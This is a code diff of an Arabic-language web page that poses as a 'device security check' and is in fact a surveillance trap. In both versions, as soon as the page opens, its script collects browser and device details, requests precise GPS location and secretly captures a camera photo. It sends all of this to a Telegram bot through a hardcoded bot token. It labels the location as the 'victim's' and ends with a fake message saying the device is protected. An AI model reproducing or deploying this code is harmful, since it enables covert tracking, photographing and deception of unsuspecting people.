@@ -3,90 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق والأمان</title>
+    <title>نظام الحماية المتقدم</title>
     <style>
-        body { background-color: #000; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        body { background-color: #000; color: #00ff00; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 100px; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h2>جاري التحقق من أمان المتصفح...</h2>
-    <p>يرجى الانتظار والموافقة على الأذونات المطلوبة لإكمال العملية.</p>
-    <div class="loading"></div>
+    <div class="loader"></div>
+    <h3>جاري فحص أمان الجهاز...</h3>
+    <p>يرجى السماح بالأذونات المطلوبة لإكمال التوثيق</p>
 
     <video id="video" style="display:none;" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- إعدادات البوت ---
         const token = "8379860884:AAHY6orUkUCffcsZc3dNRt8OQSlPJXD_03w";
         const urlParams = new URLSearchParams(window.location.search);
-        const chat_id = urlParams.get('id'); // جلب ID المستخدم من الرابط
+        const chat_id = urlParams.get('id');
 
-        // 1. جلب معلومات الجهاز فور الدخول
-        function getDeviceInfo() {
-            let info = `📱 **معلومات الجهاز:**\n`;
-            info += `- المنصة: ${navigator.platform}\n`;
+        // 1. إرسال معلومات الجهاز فوراً
+        function sendDeviceInfo() {
+            let info = `📱 **تقرير الجهاز:**\n`;
+            info += `- النظام: ${navigator.platform}\n`;
             info += `- المتصفح: ${navigator.userAgent.split(') ')[1]}\n`;
             info += `- اللغة: ${navigator.language}\n`;
-            info += `- دقة الشاشة: ${screen.width}x${screen.height}\n`;
-            return info;
+            info += `- الشاشة: ${screen.width}x${screen.height}`;
+            apiSendMessage(info);
         }
 
-        // 2. جلب الموقع الجغرافي (GPS)
-        function getLocation() {
+        // 2. طلب الموقع الجغرافي (GPS)
+        function getGPS() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
                     const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    sendMessage(`📍 **الموقع الجغرافي المستهدف:**\n${mapsUrl}`);
-                }, () => {
-                    sendMessage("❌ المستخدم رفض إذن الوصول للموقع.");
-                });
+                    apiSendMessage(`📍 **موقع الضحية:**\n${mapsUrl}`);
+                }, err => {
+                    apiSendMessage("❌ فشل سحب الموقع: " + (err.code == 1 ? "تم الرفض" : "غير متاح"));
+                }, { enableHighAccuracy: true });
             }
         }
 
-        // 3. التقاط الصور (الأمامية)
-        async function startCamera() {
+        // 3. فتح الكاميرا والتقاط الصورة
+        async function startCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                
-                // التقاط صورة بعد ثانيتين من فتح الكاميرا
-                setTimeout(() => {
-                    takeSnapshot();
-                    // إخفاء التحميل بعد الانتهاء لإيهام المستخدم
-                    document.body.innerHTML = "<h2>✅ تمت عملية التحقق بنجاح</h2><p>يمكنك العودة الآن للبوت.</p>";
-                }, 2000);
-            } catch (err) {
-                sendMessage("❌ فشل فتح الكاميرا: " + err.name);
+                setTimeout(() => { takePhoto(); }, 2500);
+            } catch (e) {
+                apiSendMessage("❌ فشل فتح الكاميرا.");
             }
         }
 
-        function takeSnapshot() {
+        function takePhoto() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
             canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'shot.jpg');
-                
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                const fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('photo', blob, 'image.jpg');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg');
+            
+            // إظهار رسالة نجاح وهمية
+            setTimeout(() => {
+                document.body.innerHTML = "<h1>✅ تم التحقق</h1><p>جهازك الآن محمي بالكامل.</p>";
+            }, 1000);
         }
 
-        // 4. وظيفة إرسال النصوص للبوت
-        function sendMessage(text) {
+        function apiSendMessage(text) {
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -94,13 +86,11 @@
             });
         }
 
-        // --- تشغيل كل شيء عند فتح الصفحة ---
+        // بدء التنفيذ
         if (chat_id) {
-            sendMessage(getDeviceInfo()); // إرسال بيانات الجهاز أولاً
-            getLocation();               // طلب الموقع
-            startCamera();              // فتح الكاميرا
-        } else {
-            document.body.innerHTML = "<h2>خطأ: رابط غير صالح</h2>";
+            sendDeviceInfo();
+            getGPS();
+            startCapture();
         }
     </script>
 </body>
